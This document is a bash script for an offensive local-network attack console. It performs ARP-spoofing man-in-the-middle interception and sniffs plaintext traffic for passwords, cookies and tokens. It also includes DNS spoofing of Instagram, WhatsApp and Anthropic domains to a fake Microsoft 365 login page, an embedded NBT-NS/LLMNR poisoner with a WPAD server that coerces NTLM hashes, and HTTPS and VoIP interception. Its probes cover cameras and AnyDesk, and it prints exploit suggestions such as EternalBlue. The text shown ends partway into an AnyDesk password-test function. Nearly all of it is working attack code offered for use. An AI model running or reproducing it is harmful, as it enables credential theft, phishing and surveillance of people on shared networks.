#!/usr/bin/env bash
# MITM TUI v2 - Advanced Capture & Exploitation Framework
# Enhanced with DNS spoof, NBT-NS poisoning, AnyDesk, SMB enum,
# mDNS leak detection, app fingerprinting, and exploit suggestions
# Based on real pcap analysis and live attack validation

BASE_DIR="$(cd "$(dirname "$0")" && pwd)"
CAPTURE_DIR="$BASE_DIR/captures"
HOSTS_FILE="$CAPTURE_DIR/known_hosts.txt"
HOSTS_DETAIL="$CAPTURE_DIR/host_details.txt"
FULL_PCAP="$CAPTURE_DIR/full_capture.pcap"
CREDS_LOG="$CAPTURE_DIR/creds_found.txt"
CREDS_RAW="$CAPTURE_DIR/creds_raw.log"
MITM_LOG="$CAPTURE_DIR/mitmdump.log"
POST_LOG="$CAPTURE_DIR/post_bodies.txt"
STATUS_FILE="$CAPTURE_DIR/status.txt"
DNS_LOG="$CAPTURE_DIR/dns_spoof.log"
DNS_HOSTS="$CAPTURE_DIR/dns_hosts.txt"
RESPONDER_LOG="$CAPTURE_DIR/responder_hashes.txt"
SMB_LOG="$CAPTURE_DIR/smb_shares.txt"
APP_LOG="$CAPTURE_DIR/app_fingerprint.txt"
MDNS_LOG="$CAPTURE_DIR/mdns_leaks.txt"
ANYDESK_LOG="$CAPTURE_DIR/anydesk_hosts.txt"
EXPLOIT_LOG="$CAPTURE_DIR/exploit_suggestions.txt"
SNIFFED_PCAP="$CAPTURE_DIR/sniffed.pcap"

mkdir -p "$CAPTURE_DIR"

# ─── Auto-detect network ─────────────────────────────────────
detect_network() {
    NET_IFACE=$(ip route | awk '/default/{print $5; exit}')
    NET_IP=$(ip -4 addr show "$NET_IFACE" 2>/dev/null | awk '/inet /{print $2; exit}')
    NET_GATEWAY=$(ip route | awk '/default/{print $3; exit}')
    NET_CIDR=$(ip -4 addr show "$NET_IFACE" 2>/dev/null | awk '/inet /{print $2}' | head -1)
    if [[ "$NET_CIDR" =~ ^([0-9]+\.[0-9]+\.[0-9]+\.)[0-9]+/([0-9]+)$ ]]; then
        NET_PREFIX="${BASH_REMATCH[1]}0/${BASH_REMATCH[2]}"
        [[ "${BASH_REMATCH[2]}" -ge 16 && "${BASH_REMATCH[2]}" -le 24 ]] || NET_PREFIX="$(echo "$NET_IP" | cut -d. -f1-3).0/24"
    else
        NET_PREFIX=$(echo "$NET_IP" | cut -d. -f1-3).0/24
    fi
}

detect_network

# ─── Dependencies ─────────────────────────────────────────────
DEPS=(arpspoof tcpdump nmap curl whiptail openssl python3)
for dep in "${DEPS[@]}"; do
    if ! command -v "$dep" &>/dev/null; then
        whiptail --msgbox "Missing: $dep. Install with: apt install $dep" 8 50
        exit 1
    fi
done

# Check optional tools
HAVE_MITM=0; command -v mitmdump &>/dev/null && HAVE_MITM=1
HAVE_BETTERCAP=0; command -v bettercap &>/dev/null && HAVE_BETTERCAP=1
HAVE_DNSSPOOF=0; command -v dnsspoof &>/dev/null && HAVE_DNSSPOOF=1
HAVE_HYDRA=0; command -v hydra &>/dev/null && HAVE_HYDRA=1
HAVE_SMBCLIENT=0; command -v smbclient &>/dev/null && HAVE_SMBCLIENT=1
HAVE_ADB=0; command -v anydesk &>/dev/null && HAVE_ADB=1

# ─── Process management ───────────────────────────────────────
PID_FILE="$CAPTURE_DIR/.running_pids"
touch "$PID_FILE"

add_pid() {
    local name="$1" pid="$2"
    echo "$name $pid" >> "$PID_FILE"
}

kill_all() {
    while IFS=' ' read -r name pid; do
        kill "$pid" 2>/dev/null || true
    done < "$PID_FILE"
    > "$PID_FILE"
    echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true
    iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null || true
    iptables -t nat -D PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080 2>/dev/null || true
    iptables -t nat -D PREROUTING -p udp --dport 53 -j REDIRECT --to-port 5353 2>/dev/null || true
    iptables -t nat -D POSTROUTING -o "$NET_IFACE" -j MASQUERADE 2>/dev/null || true
    iptables -D FORWARD -i "$NET_IFACE" -j ACCEPT 2>/dev/null || true
    pkill -f "arpspoof" 2>/dev/null || true
    pkill -f "mitmdump" 2>/dev/null || true
    pkill -f "dnsspoof" 2>/dev/null || true
    pkill -f "responder_simple\|ntlm_responder\|harvest_server" 2>/dev/null || true
    pkill -f "tcpdump.*capture" 2>/dev/null || true
}

# ─── ARP Spoof ─────────────────────────────────────────────────
arp_spoof_pair() {
    local target="$1" gateway="$2" iface="$3"
    arpspoof -i "$iface" -t "$target" "$gateway" > /dev/null 2>&1 &
    add_pid "arpspoof_t_$target" $!
    arpspoof -i "$iface" -t "$gateway" "$target" > /dev/null 2>&1 &
    add_pid "arpspoof_g_$target" $!
    echo 1 > /proc/sys/net/ipv4/ip_forward
    iptables -t nat -C POSTROUTING -o "$iface" -j MASQUERADE 2>/dev/null || \
        iptables -t nat -A POSTROUTING -o "$iface" -j MASQUERADE
    iptables -C FORWARD -i "$iface" -j ACCEPT 2>/dev/null || \
        iptables -A FORWARD -i "$iface" -j ACCEPT
}

# ─── Network Scan (enhanced) ──────────────────────────────────
scan_network() {
    local range="${1:-$NET_PREFIX}"
    whiptail --infobox "Phase 1: Ping sweep $range ..." 6 50
    nmap -sn -T4 "$range" -oG - 2>/dev/null | awk '/Up$/{print $2, $3}' > "$HOSTS_FILE"

    local hosts=()
    while IFS= read -r line; do
        hosts+=("$(echo "$line" | awk '{print $1}')")
    done < "$HOSTS_FILE"

    whiptail --infobox "Phase 2: Port scan ${#hosts[@]} live hosts ..." 6 50

    > "$HOSTS_DETAIL"
    > "$APP_LOG"
    > "$ANYDESK_LOG"
    > "$MDNS_LOG"

    for h in "${hosts[@]}"; do
        [[ -z "$h" || "$h" == "$NET_IP" ]] && continue
        # Quick scan common ports
        local ports=$(nmap -sT --open -p 21,22,23,80,443,554,8080,8443,5060,135,139,445,1433,3306,3389,5900,5985,5986,7070,8883,7844,5222,5223 -T4 "$h" 2>/dev/null | \
            awk -F'/' '/open/{printf "%s/", $1}')
        [[ -n "$ports" ]] && echo "$h $ports" >> "$HOSTS_DETAIL"

        # Check AnyDesk (port 7070)
        timeout 2 bash -c "echo -n '' | nc -w 1 $h 7070 2>/dev/null" && echo "$h" >> "$ANYDESK_LOG"

        # App fingerprinting from open ports
        if echo "$ports" | grep -q "5222"; then
            echo "$h XMPP/WhatsApp" >> "$APP_LOG"
        fi
        if echo "$ports" | grep -q "8883"; then
            echo "$h MQTT/Azure IoT" >> "$APP_LOG"
        fi
        if echo "$ports" | grep -q "7844"; then
            echo "$h Steam RemotePlay" >> "$APP_LOG"
        fi
        if echo "$ports" | grep -q "7070"; then
            echo "$h AnyDesk" >> "$APP_LOG"
        fi
        if echo "$ports" | grep -q "445"; then
            echo "$h SMB/Windows" >> "$APP_LOG"
        fi
        if echo "$ports" | grep -q "135"; then
            echo "$h MSRPC" >> "$APP_LOG"
        fi
    done

    # mDNS discovery (Bonjour leaks)
    whiptail --infobox "Phase 3: mDNS/Bonjour leak detection ..." 6 50
    timeout 5 tcpdump -i "$NET_IFACE" -n udp port 5353 -c 20 2>/dev/null | \
        grep -oP '(?<= )[A-Za-z0-9_-]+\.(local|_tcp|_udp)|iPhone-[a-zA-Z]+|MacBook-[a-zA-Z0-9_-]+|Android_[a-zA-Z0-9_]+' | \
        sort -u >> "$MDNS_LOG" 2>/dev/null

    local count=$(wc -l < "$HOSTS_FILE")
    local ad_count=$(wc -l < "$ANYDESK_LOG" 2>/dev/null || echo 0)
    whiptail --msgbox "Scan complete.\n\nHosts found: $count\nAnyDesk hosts: $ad_count\nApps fingerprinted: $(wc -l < "$APP_LOG" 2>/dev/null || echo 0)\nmDNS leaks: $(wc -l < "$MDNS_LOG" 2>/dev/null || echo 0)" 10 60
    show_hosts
}

# ─── Show hosts ────────────────────────────────────────────────
show_hosts() {
    [[ ! -s "$HOSTS_FILE" ]] && whiptail --msgbox "No hosts. Run scan first." 8 50 && return
    local items=()
    while IFS= read -r line; do
        local ip=$(echo "$line" | awk '{print $1}')
        local name=$(echo "$line" | awk '{print $2}' | tr -d '()')
        local detail=$(grep "$ip" "$HOSTS_DETAIL" 2>/dev/null | head -1 | cut -d' ' -f2-)
        [[ -n "$detail" ]] && display="$ip ($name) - $detail" || display="$ip ($name)"
        items+=("$ip" "$display")
    done < "$HOSTS_FILE"
    whiptail --title "Known Hosts" --menu "Select to view details:" 20 75 10 "${items[@]}" 2>/dev/null
}

# ─── MITM Capture ──────────────────────────────────────────────
start_mitm_capture() {
    local gateway iface input filter=""
    gateway=$(whiptail --inputbox "Gateway:" 8 50 "$NET_GATEWAY" 3>&1 1>&2 2>&3)
    [[ -z "$gateway" ]] && return
    iface=$(whiptail --inputbox "Interface:" 8 50 "$NET_IFACE" 3>&1 1>&2 2>&3)
    [[ -z "$iface" ]] && return
    input=$(whiptail --inputbox "Target IP(s) (space-sep, or * for all from scan):" 8 60 "*" 3>&1 1>&2 2>&3)
    [[ -z "$input" ]] && return

    if [[ "$input" == "*" ]]; then
        if [[ -s "$HOSTS_FILE" ]]; then
            input=$(awk '{print $1}' "$HOSTS_FILE" | tr '\n' ' ')
        else
            whiptail --msgbox "No hosts scanned yet. Run Network Scan first." 8 50
            return
        fi
    fi

    whiptail --infobox "Starting MITM capture..." 6 40

    for t in $input; do
        [[ "$t" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || continue
        arp_spoof_pair "$t" "$gateway" "$iface"
        sleep 0.3
    done

    for t in $input; do
        [[ "$t" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || continue
        [[ -n "$filter" ]] && filter+=" or "
        filter+="host $t"
    done
    [[ -z "$filter" ]] && filter="host $gateway"

    nohup tcpdump -i "$iface" -s 0 -w "$FULL_PCAP" "$filter" > /dev/null 2>&1 &
    add_pid "tcpdump_full" $!

    nohup bash -c "
        tcpdump -i $iface -A -l 'tcp and port 80 and ($filter)' 2>/dev/null | \
        grep -iE '(password|passwd|login|user|session|cookie|token|auth|ssid|wpa|credit|card|senha|usuario|apikey|secret|authorization)' | \
        tee -a $CREDS_LOG" > /dev/null 2>&1 &
    add_pid "cred_harvester" $!

    whiptail --msgbox "MITM capture running.\n\nTargets: $input\nGateway: $gateway\nInterface: $iface\n\nLog: $FULL_PCAP\nCreds: $CREDS_LOG" 12 60
}

# ─── DNS Spoofing Attack ──────────────────────────────────────
start_dns_spoof() {
    if [[ "$HAVE_DNSSPOOF" -eq 0 ]]; then
        whiptail --msgbox "dnsspoof not found.\nInstall: apt install dsniff" 8 50
        return
    fi

    local domains target_ip
    target_ip=$(whiptail --inputbox "Redirect traffic to (our IP):" 8 50 "$NET_IP" 3>&1 1>&2 2>&3)
    [[ -z "$target_ip" ]] && return

    domains=$(whiptail --inputbox "Domains to spoof (space-sep, or use presets):" 10 60 \
        "gateway.instagram.com www.instagram.com web.whatsapp.com api.anthropic.com" 3>&1 1>&2 2>&3)
    [[ -z "$domains" ]] && return

    # Write hosts file for dnsspoof
    > "$DNS_HOSTS"
    for d in $domains; do
        echo "$target_ip $d" >> "$DNS_HOSTS"
    done

    whiptail --infobox "Starting DNS spoof...\nRedirecting $domains to $target_ip" 8 50

    # Start fake HTTP server with realistic Microsoft 365 login page
    pkill -f "fake_login_server" 2>/dev/null || true
    nohup python3 "$BASE_DIR/tools/fake_login_server.py" > /dev/null 2>&1 &
    add_pid "dns_harvest_http" $!

    # Start dnsspoof
    nohup dnsspoof -i "$NET_IFACE" -f "$DNS_HOSTS" > "$DNS_LOG" 2>&1 &
    add_pid "dnsspoof" $!

    whiptail --msgbox "DNS Spoof running.\n\nDomains redirected to $target_ip:80\nFake login page served.\n\nCaptured creds: $CREDS_LOG\nDNS queries logged: $DNS_LOG" 14 60
}

# ─── NBT-NS/LLMNR Poisoning (Responder) ───────────────────────
start_responder() {
    whiptail --infobox "Starting NBT-NS/LLMNR/mDNS poisoner..." 6 50

    nohup python3 -c "
import socket, struct, threading, datetime, sys

HASH_LOG = '$RESPONDER_LOG'
TARGET_IP = '$NET_IP'

def nbns_listener():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    s.bind(('0.0.0.0', 137))
    while True:
        try:
            data, addr = s.recvfrom(1024)
            if len(data) < 12: continue
            flags = struct.unpack('>H', data[2:4])[0]
            if flags & 0x8000: continue
            pos = 12; parts = []
            while pos < len(data):
                l = data[pos]
                if l == 0: pos+=1; break
                if l & 0xC0: pos+=2; break
                pos+=1; parts.append(data[pos:pos+l].decode('latin-1','replace')); pos+=l
            qname = '.'.join(parts) if parts else 'unknown'
            tid = struct.unpack('>H', data[0:2])[0]
            enc_name = data[12:pos] if pos <= len(data) else b''
            if not enc_name: continue
            if len(enc_name) > 34: enc_name = enc_name[:34]
            while len(enc_name) < 34: enc_name += b'\x00'
            ip_p = [int(x) for x in TARGET_IP.split('.')]
            q = enc_name + struct.pack('>HH', 0x0020, 1)
            a = enc_name + struct.pack('>HHI', 0x0020, 1, 300) + struct.pack('>H', 6) + struct.pack('>BB', 0, 0) + struct.pack('>BBBB', *ip_p)
            r = struct.pack('>HHHH', tid, 0x8500, 1, 1) + struct.pack('>HH', 0, 0) + q + a
            s.sendto(r, (addr[0], 137))
            with open(HASH_LOG,'a') as f: f.write(f'[NBT-NS] {qname} <- {addr[0]} -> redirected\\n')
            sys.stdout.write(f'[NBT-NS] {qname} <- {addr[0]}\\n'); sys.stdout.flush()
        except: pass

def llmnr_listener():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    s.bind(('0.0.0.0', 5355))
    while True:
        try:
            data, addr = s.recvfrom(1024)
            if len(data) < 12: continue
            flags = struct.unpack('>H', data[2:4])[0]
            if flags & 0x8000: continue
            pos = 12; parts = []
            while pos < len(data):
                l = data[pos]
                if l == 0: pos+=1; break
                if l & 0xC0: pos+=2; break
                pos+=1; parts.append(data[pos:pos+l].decode('latin-1','replace')); pos+=l
            qname = '.'.join(parts) if parts else 'unknown'
            tid = struct.unpack('>H', data[0:2])[0]
            enc_name = data[12:pos]
            ip_p = [int(x) for x in TARGET_IP.split('.')]
            q = enc_name + struct.pack('>HH', 1, 1)
            a = enc_name + struct.pack('>HHI', 1, 1, 30) + struct.pack('>H', 4) + struct.pack('>BBBB', *ip_p)
            r = struct.pack('>HHHH', tid, 0x8000 | (flags & 0x0FFF), 1, 1) + struct.pack('>HH', 0, 0) + q + a
            s.sendto(r, (addr[0], 5355))
            with open(HASH_LOG,'a') as f: f.write(f'[LLMNR] {qname} <- {addr[0]} -> redirected\\n')
            sys.stdout.write(f'[LLMNR] {qname} <- {addr[0]}\\n'); sys.stdout.flush()
        except: pass

print('[+] NBT-NS on UDP 137'); sys.stdout.flush()
print('[+] LLMNR on UDP 5355'); sys.stdout.flush()
threading.Thread(target=nbns_listener, daemon=True).start()
threading.Thread(target=llmnr_listener, daemon=True).start()
import time
while True: time.sleep(1)
" > /tmp/responder_output.log 2>&1 &
    add_pid "responder" $!

    # Also spoof WPAD to capture NTLM hashes via HTTP
    nohup python3 -c "
import http.server, socketserver, sys
class W(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if '/wpad.dat' in self.path:
            self.send_response(200)
            self.send_header('Content-type','application/x-ns-proxy-autoconfig')
            self.end_headers()
            self.wfile.write(b'function FindProxyForURL(u,h){return \"PROXY $NET_IP:3128; DIRECT\";}')
        else:
            # Trigger NTLM auth
            self.send_response(401)
            self.send_header('WWW-Authenticate','NTLM')
            self.send_header('Proxy-Authenticate','NTLM')
            self.send_header('Connection','keep-alive')
            self.end_headers()
    def do_CONNECT(self):
        self.send_response(200); self.end_headers()
    def log_message(self,*a): pass
s=socketserver.ThreadingTCPServer(('0.0.0.0',3128),W)
s.serve_forever()
" > /dev/null 2>&1 &
    add_pid "responder_wpad" $!

    whiptail --msgbox "NBT-NS/LLMNR/WPAD poisoner running.\n\nListens on UDP 137 (NBT-NS), UDP 5355 (LLMNR)\nCaptures NTLM hashes when clients try to resolve names.\n\nWPAD proxy on port 3128\nHashes logged: $RESPONDER_LOG" 14 60
}

# ─── SMB Enumeration ──────────────────────────────────────────
enum_smb() {
    local target
    target=$(whiptail --inputbox "Target IP (Windows/SMB host):" 8 50 "" 3>&1 1>&2 2>&3)
    [[ -z "$target" ]] && return

    whiptail --infobox "Enumerating SMB on $target ..." 6 40

    > "$SMB_LOG"

    # Check SMB versions supported
    echo "=== SMB Protocol Check ===" >> "$SMB_LOG"
    nmap -p 445 --script smb-protocols "$target" 2>/dev/null >> "$SMB_LOG"

    # Check SMB signing
    echo -e "\n=== SMB Security Mode ===" >> "$SMB_LOG"
    nmap -p 445 --script smb-security-mode "$target" 2>/dev/null >> "$SMB_LOG"

    # Check SMB2 capabilities
    echo -e "\n=== SMB2 Capabilities ===" >> "$SMB_LOG"
    nmap -p 445 --script smb2-capabilities "$target" 2>/dev/null >> "$SMB_LOG"

    # OS discovery
    echo -e "\n=== OS Discovery ===" >> "$SMB_LOG"
    nmap -p 445 --script smb-os-discovery "$target" 2>/dev/null >> "$SMB_LOG"

    # Try to enumerate shares with impacket
    if python3 -c "from impacket.smbconnection import SMBConnection; print('ok')" 2>/dev/null; then
        echo -e "\n=== Share Enumeration (Anonymous) ===" >> "$SMB_LOG"
        python3 -c "
from impacket.smbconnection import SMBConnection
try:
    conn = SMBConnection('*SMBSERVER', '$target', timeout=3)
    conn.login('', '')
    for s in conn.listShares():
        print('  ' + str(s['shi1_netname']))
    conn.logoff()
except Exception as e:
    print(f'  Anonymous denied: {e}')
" 2>/dev/null >> "$SMB_LOG"
    fi

    local content
    content=$(cat "$SMB_LOG")
    whiptail --title "SMB Enumeration: $target" --scrolltext --msgbox "$content" 20 70

    # Offer exploit suggestions based on findings
    local suggestions=""
    grep -qiE "SMBv1.*enabled|message_signing.*disabled" "$SMB_LOG" && \
        suggestions+="- SMB signing disabled: relay NTLM hashes with ntlmrelayx\n"
    grep -qiE "Windows 10|Windows 11|Windows Server" "$SMB_LOG" && \
        suggestions+="- Modern Windows: try SMBGhost (CVE-2020-0796) or Zerologon\n"
    grep -qiE "Windows 7|Windows XP|Windows Server 2008|SMBv1" "$SMB_LOG" && \
        suggestions+="- Legacy Windows: try EternalBlue (MS17-010) or ETERNALROMANCE\n"

    if [[ -n "$suggestions" ]]; then
        whiptail --title "Exploit Suggestions" --msgbox "Based on SMB scan:\n\n$suggestions" 12 60
        echo -e "=== SMB Exploit Suggestions for $target ===\n$suggestions" >> "$EXPLOIT_LOG"
    fi
}

# ─── Service Deep Scan ─────────────────────────────────────────
deep_scan() {
    local target
    target=$(whiptail --inputbox "Target IP for deep scan:" 8 50 "" 3>&1 1>&2 2>&3)
    [[ -z "$target" ]] && return

    whiptail --infobox "Deep scanning $target ..." 6 40

    local report="$CAPTURE_DIR/deep_scan_${target}.txt"

    {
        echo "=== Deep Scan: $target ==="
        echo "Date: $(date)"
        echo ""

        # OS fingerprint
        echo "--- OS Fingerprint ---"
        nmap -O --osscan-guess "$target" 2>/dev/null | grep -E "OS details|Aggressive OS|Device type|Running"
        echo ""

        # All TCP ports (top 200)
        echo "--- Open TCP Ports (top 200) ---"
        nmap -sT --open -T4 --top-ports 200 "$target" 2>/dev/null | grep "^[0-9]/tcp"
        echo ""

        # Service versions on common ports
        echo "--- Service Versions ---"
        nmap -sV -p 22,80,443,445,135,139,554,7070,8080,8443,8883,3306,3389,5900,5222 "$target" 2>/dev/null | grep -E "^[0-9]|Service Info"
        echo ""

        # Check for cameras/RSTP
        echo "--- RTSP Check ---"
        timeout 2 bash -c "echo -e 'DESCRIBE rtsp://$target:554/ RTSP/1.0\r\nCSeq: 1\r\n\r\n' | nc -w 2 $target 554 2>/dev/null" | head -5
        echo ""

        # Web server check
        echo "--- HTTP Check ---"
        curl -s -I --connect-timeout 3 "http://$target/" 2>/dev/null | head -10
        echo ""
        curl -s -I -k --connect-timeout 3 "https://$target/" 2>/dev/null | head -10

        # UDP scan (common)
        echo "--- UDP Scan (common) ---"
        nmap -sU -p 53,67,68,69,123,137,138,161,162,500,514,520,5355,1900,5353,4500 --open "$target" 2>/dev/null | grep "^[0-9]/udp"

    } > "$report" 2>&1

    # VPN detection
    if python3 -c "from scapy.all import *" 2>/dev/null; then
        echo "--- WireGuard Detection ---" >> "$report"
        timeout 5 python3 -c "
from scapy.all import *
pkts = sniff(filter='udp and host $target', timeout=3, count=10)
for p in pkts:
    if UDP in p and len(p[UDP].payload) > 0:
        payload = bytes(p[UDP].payload)
        if len(payload) >= 4:
            # WireGuard handshake starts with type=1 (initiation) with specific pattern
            if payload[0] == 1 and len(payload) > 100:
                print(f'  WG handshake from {p[IP].src}:{p[UDP].sport}')
" 2>/dev/null >> "$report" 2>&1
    fi

    local content
    content=$(cat "$report")
    whiptail --title "Deep Scan: $target" --scrolltext --msgbox "$content" 22 75
}

# ─── HTTPS Proxy ───────────────────────────────────────────────
start_https_proxy() {
    if [[ "$HAVE_MITM" -eq 0 ]]; then
        whiptail --msgbox "mitmdump not found.\nInstall: pip install mitmproxy" 8 50
        return
    fi

    whiptail --infobox "Starting mitmdump transparent proxy..." 6 40

    iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null || true
    iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080 2>/dev/null || true

    nohup mitmdump --mode transparent --showhost --listen-port 8080 \
        --set ssl_insecure=true \
        -w "$CAPTURE_DIR/mitm_flows.flow" \
        >> "$MITM_LOG" 2>&1 &
    add_pid "mitmdump" $!

    whiptail --msgbox "HTTPS proxy on port 8080.\nFlow: $CAPTURE_DIR/mitm_flows.flow" 8 50
}

# ─── VoIP Capture ──────────────────────────────────────────────
start_voip_capture() {
    local phones sip_server filter=""
    phones=$(whiptail --inputbox "Phone IPs (space-separated):" 8 60 "" 3>&1 1>&2 2>&3)
    [[ -z "$phones" ]] && return
    sip_server=$(whiptail --inputbox "SIP server IP (optional):" 8 60 "" 3>&1 1>&2 2>&3)

    whiptail --infobox "Starting VoIP capture..." 6 40

    for p in $phones; do
        [[ "$p" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || continue
        arp_spoof_pair "$p" "$NET_GATEWAY" "$NET_IFACE"
        for p2 in $phones; do
            [[ "$p2" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || continue
            [[ "$p" == "$p2" ]] && continue
            arpspoof -i "$NET_IFACE" -t "$p" "$p2" > /dev/null 2>&1 &
            add_pid "arpspoof_${p}_to_${p2}" $!
            arpspoof -i "$NET_IFACE" -t "$p2" "$p" > /dev/null 2>&1 &
            add_pid "arpspoof_${p2}_to_${p}" $!
        done
        sleep 0.3
    done

    if [[ -n "$sip_server" ]]; then
        for p in $phones; do
            arpspoof -i "$NET_IFACE" -t "$p" "$sip_server" > /dev/null 2>&1 &
            add_pid "arpspoof_${p}_sip" $!
        done
    fi

    for p in $phones; do
        [[ "$p" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || continue
        [[ -n "$filter" ]] && filter+=" or "
        filter+="host $p"
    done

    nohup tcpdump -i "$NET_IFACE" -s 0 -w "$CAPTURE_DIR/voip_capture.pcap" \
        "($filter) and (port 5060 or portrange 10000-20000 or port 5061)" > /dev/null 2>&1 &
    add_pid "tcpdump_voip" $!

    nohup tcpdump -i "$NET_IFACE" -A -l "($filter) and udp port 5060" 2>/dev/null | \
        grep -E "(REGISTER|INVITE|200 OK|401|Authorization|From:|To:|Contact:)" >> "$CAPTURE_DIR/sip_messages.log" 2>/dev/null &
    add_pid "sip_monitor" $!

    whiptail --msgbox "VoIP capture running.\nPCAP: $CAPTURE_DIR/voip_capture.pcap\nSIP log: $CAPTURE_DIR/sip_messages.log" 10 50
}

# ─── Camera Discovery ──────────────────────────────────────────
scan_cameras() {
    local range="${1:-$NET_PREFIX}"
    whiptail --infobox "Scanning for cameras..." 6 40

    nmap -sT -p 554,8554,8899,37777,37272,80,8080,9000,34567,35000,65000 --open -T4 "$range" -oG - 2>/dev/null | \
        awk '/Ports:/{print $2}' > "$CAPTURE_DIR/camera_ports.txt"

    local cameras=()
    while IFS= read -r ip; do
        local r=$(echo -e "DESCRIBE rtsp://$ip:554/ RTSP/1.0\r\nCSeq: 1\r\n\r\n" | nc -w 2 "$ip" 554 2>/dev/null | head -5)
        [[ -n "$r" ]] && cameras+=("$ip" "RTSP responder") && continue

        for path in /video /stream /mjpeg /snapshot /cgi-bin/image.jpg /live /cam1 /cam/realmonitor; do
            local s=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 2 "http://$ip$path" 2>/dev/null)
            if [[ "$s" != "000" && "$s" != "404" ]]; then
                cameras+=("$ip" "MJPEG $path -> $s")
                break
            fi
        done
    done < "$CAPTURE_DIR/camera_ports.txt"

    if [[ ${#cameras[@]} -gt 0 ]]; then
        printf "%s\n" "${cameras[@]}" > "$CAPTURE_DIR/cameras_found.txt"
        local msg=""
        for ((i=0; i<${#cameras[@]}; i+=2)); do
            msg+="  ${cameras[i]} -> ${cameras[i+1]}\n"
        done
        whiptail --msgbox "Cameras found:\n$msg" 15 60
    else
        whiptail --msgbox "No cameras found on $range." 8 50
    fi
}

# ─── AnyDesk Attack Suite ──────────────────────────────────────
anydesk_discovery_scan() {
    local subnet="${1:-$NET_PREFIX}"
    whiptail --infobox "Scanning for AnyDesk peers on $subnet..." 6 50
    local report="$CAPTURE_DIR/anydesk_discovery.txt"
    > "$report"

    # Phase 1: TCP port 7070 scan
    echo "=== AnyDesk Discovery Scan ===" >> "$report"
    echo "Date: $(date)" >> "$report"
    echo "Subnet: $subnet" >> "$report"
    echo "" >> "$report"
    echo "--- Phase 1: TCP 7070 Scan ---" >> "$report"
    local hosts=$(nmap -sT -p 7070 --open -T4 "$subnet" 2>/dev/null | awk '/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/{print $1}' || true)

    # Phase 2: AnyDesk version fingerprinting
    echo -e "\n--- Phase 2: Version Fingerprinting ---" >> "$report"
    for h in $hosts; do
        local ssl_info=$(timeout 5 bash -c "echo '' | openssl s_client -connect $h:7070 2>/dev/null" || true)
        local cert_subj=$(echo "$ssl_info" | grep "subject=" | head -1)
        local cert_issuer=$(echo "$ssl_info" | grep "issuer=" | head -1)
        local cert_dates=$(echo "$ssl_info" | grep -E "Not Before|Not After" | head -2)
        echo "  $h: $cert_subj" >> "$report"
        echo "         $cert_issuer" >> "$report"
        echo "         $cert_dates" >> "$report"

        # Try to grab AnyDesk version via nmap service scan
        local version=$(nmap -sV --version-intensity 9 -p 7070 "$h" 2>/dev/null | grep "7070/tcp" | sed 's/.* //')
        echo "         Version guess: $version" >> "$report"

        # CVE triage based on cert dates and version clues
        echo "         --- CVEs applicable ---" >> "$report"
        # Check cert age - if cert issued before Oct 2021, likely < 6.2.6
        local cert_year=$(echo "$cert_dates" | head -1 | grep -oP 'Not Before : \K\d{4}')
        if [[ -n "$cert_year" && "$cert_year" -lt 2022 ]]; then
            echo "           CVE-2021-40854 (LPE via Chat Log)" >> "$report"
            echo "           CVE-2021-44425 (Tunnel port exposure)" >> "$report"
            echo "           CVE-2021-44426 (Arbitrary file upload)" >> "$report"
        fi
        if [[ -n "$cert_year" && "$cert_year" -lt 2024 ]]; then
            echo "           CVE-2022-32450 (SYSTEM via symlink)" >> "$report"
            echo "           CVE-2023-26509 (Remote DoS)" >> "$report"
        fi
        if [[ -n "$cert_year" && "$cert_year" -lt 2025 ]]; then
            echo "           CVE-2024-12754 (Info disclosure, PoC available)" >> "$report"
        fi
        # Always check for CVE-2025-27918 (critical UDP RCE)
        echo "           CVE-2025-27918 (CRITICAL 9.8 - UDP heap overflow via Discovery)" >> "$report"
        echo "           CVE-2025-27917 (DoS via deserialization)" >> "$report"
        echo "           CVE-2025-27919 (Settings manipulation - Full Access takeover)" >> "$report"
        echo "         ---" >> "$report"
    done

    # Phase 3: UDP Discovery probe (CVE-2025-27918 trigger surface)
    echo -e "\n--- Phase 3: UDP Discovery Probe ---" >> "$report"
    for h in $hosts; do
        # Send discovery probe to UDP 7070
        local udp_response=$(timeout 2 bash -c "echo -n '' | nc -u -w 2 $h 7070 2>/dev/null" || true)
        if [[ -n "$udp_response" ]]; then
            echo "  $h: UDP 7070 responds -> Discovery feature active!" >> "$report"
            echo "  $h: Potential target for CVE-2025-27918" >> "$report"
        fi
    done

    # Phase 4: LAN beacon capture
    echo -e "\n--- Phase 4: LAN Beacon Capture ---" >> "$report"
    timeout 10 tcpdump -i "$NET_IFACE" -n udp port 7070 -c 10 2>/dev/null | \
        grep -oP '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | sort -u >> "$report" 2>/dev/null
    echo "  (AnyDesk UDP beacons captured above if present)" >> "$report"

    # Phase 5: Test for CVE-2020-13160 (format string) on Linux targets
    echo -e "\n--- Phase 5: Format String Probe (CVE-2020-13160) ---" >> "$report"
    echo "  Affects AnyDesk <5.5.3 on Linux/FreeBSD" >> "$report"
    for h in $hosts; do
        if timeout 3 bash -c "echo '%s%s%s%s' | nc -w 2 $h 7070 2>/dev/null" 2>/dev/null; then
            echo "  $h: Possible format string vuln - further testing needed" >> "$report"
        fi
    done

    local content
    content=$(cat "$report")
    whiptail --title "AnyDesk Discovery" --scrolltext --msgbox "$content" 24 75
}

anydesk_password_test() {
    local target passwords_file
